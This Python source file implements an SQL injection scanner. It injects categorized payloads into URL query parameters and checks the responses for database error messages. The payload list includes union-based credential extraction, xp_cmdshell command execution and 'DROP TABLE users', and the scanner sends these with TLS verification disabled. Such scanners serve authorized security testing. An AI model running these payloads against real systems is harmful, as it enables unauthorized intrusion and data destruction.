# scanner/sqli_scanner.py

import requests
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
import logging
import random

# Define SQL error messages to look for in responses
SQL_ERRORS = {
    "MySQL": [
        "you have an error in your sql syntax;",
        "warning: mysql",
        "unclosed quotation mark after the character string"
    ],
    "PostgreSQL": [
        "pg_query():",
        "pg_exec()",
        "postgresql"
    ],
    "SQLServer": [
        "microsoft sql server",
        "sql server",
        "unclosed quotation mark"
    ],
    "Oracle": [
        "quoted string not properly terminated",
        "oracle error"
    ],
    "SQLite": [
        "sqlite3::exception",
        "sqlite error"
    ]
}

# Define SQL payloads categorized by injection technique
SQL_PAYLOADS = {
    "basic": [
        "'", "\"", "`",
        "' OR '1'='1",
        "\" OR \"1\"=\"1",
        "'; --", "\"; --",
        "'; #", "' OR '1'='1' --",
        "\" OR \"1\"=\"1\" --",
        "' OR '1'='1' /*",
        "admin' --", "admin' #", "admin'/*",
        "')", "\"))",
        "') OR ('1'='1", "\")) OR (\"1\"=\"1"
    ],
    "union_based": [
        "' UNION SELECT NULL--",
        "' UNION SELECT 1--",
        "' UNION SELECT username, password FROM users--",
        "' UNION SELECT table_name FROM information_schema.tables--",
        "' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'--"
    ],
    "error_based": [
        "' AND 1=CONVERT(INT, (SELECT @@version))--",
        "' AND 1=(SELECT COUNT(*) FROM tablenames)--",
        "' AND 1=CAST((SELECT TOP 1 name FROM sysobjects WHERE xtype='U') AS INT)--",
        "' OR 1=1 WAITFOR DELAY '0:0:5'--",
        "' OR 1=1 AND SLEEP(5)--"
    ],
    "time_based": [
        "'; WAITFOR DELAY '0:0:5'--",
        "'; SLEEP(5)--",
        "' OR SLEEP(5)--",
        "' OR pg_sleep(5)--",
        "' OR BENCHMARK(1000000,MD5('test'))--"
    ],
    "advanced": [
        "'/**/OR/**/'1'='1",
        "' OR '1'='1'/*",
        "' OR 1=1--",
        "' OR 1=1#",
        "'; EXEC xp_cmdshell('dir')--",
        "'; EXECUTE IMMEDIATE 'DROP TABLE users'--",
        "' OR 1=1/**/--",
        "' OR '1'='1'/**/--",
        "'; DROP TABLE users--",
        "%27%20OR%20%271%27%3D%271",  # URL-encoded: ' OR '1'='1
        "\" OR \"1\"=\"1\"--",
        "%22%20OR%20%221%22%3D%221"  # URL-encoded: " OR "1"="1
    ]
}

def get_random_payloads(sql_payloads, num_payloads=5):
    """
    Select a random subset of payloads from each category.
    
    Args:
        sql_payloads (dict): Dictionary containing payload categories.
        num_payloads (int): Number of payloads to select from each category.
    
    Returns:
        list: A list of selected payloads.
    """
    selected_payloads = []
    for category, payloads in sql_payloads.items():
        if len(payloads) <= num_payloads:
            selected_payloads.extend(payloads)
        else:
            selected_payloads.extend(random.sample(payloads, num_payloads))
    return selected_payloads

def perform_sqli_scan(url, depth=1, verbose=False):
    """
    Perform SQL Injection scan on the given URL.

    Args:
        url (str): The target URL.
        depth (int): The depth of scanning (currently unused in this function).
        verbose (bool): Enable verbose output.

    Returns:
        list: A list of detected SQLi vulnerabilities.
    """
    vulnerabilities = []
    
    # Configure logging
    if verbose:
        logging.basicConfig(level=logging.DEBUG, format='[%(levelname)s] %(message)s')
    else:
        logging.basicConfig(level=logging.INFO, format='[%(levelname)s] %(message)s')

    parsed_url = urlparse(url)
    query_params = parse_qs(parsed_url.query)

    if not query_params:
        logging.info("No query parameters found in the URL to scan for SQLi.")
        return vulnerabilities

    logging.info(f"Found {len(query_params)} parameter(s) to scan for SQLi.")

    # Define the number of payloads to select from each category
    PAYLOADS_PER_CATEGORY = 5

    for param in query_params:
        original_values = query_params[param]
        logging.debug(f"Scanning parameter: {param} with value(s): {original_values}")

        # Select a subset of payloads dynamically
        injected_payloads = get_random_payloads(SQL_PAYLOADS, PAYLOADS_PER_CATEGORY)

        for payload in injected_payloads:
            # Create a copy of the original parameters
            injected_params = query_params.copy()
            # Inject the payload into the current parameter
            injected_params[param] = [value + payload for value in original_values]

            # Reconstruct the URL with injected parameters
            injected_query = urlencode(injected_params, doseq=True)
            injected_url = urlunparse((
                parsed_url.scheme,
                parsed_url.netloc,
                parsed_url.path,
                parsed_url.params,
                injected_query,
                parsed_url.fragment
            ))

            logging.debug(f"Injected URL: {injected_url}")

            try:
                response = requests.get(injected_url, timeout=10, verify=False)
                logging.debug(f"Received response with status code: {response.status_code}")

                # Analyze the response for SQL error messages
                for db, error_messages in SQL_ERRORS.items():
                    for error in error_messages:
                        if error.lower() in response.text.lower():
                            vulnerability = {
                                "parameter": param,
                                "payload": payload,
                                "db": db,
                                "error": error,
                                "url": injected_url
                            }
                            logging.warning(f"Possible SQLi vulnerability detected: {vulnerability}")
                            vulnerabilities.append(vulnerability)
                            # Once a vulnerability is found for this payload, move to the next parameter
                            break
                    else:
                        continue  # Only executed if the inner loop did NOT break
                    break  # Inner loop was broken, so break the outer loop as well

            except requests.exceptions.RequestException as e:
                logging.error(f"Error occurred while requesting {injected_url}: {e}")
                continue

    return vulnerabilities
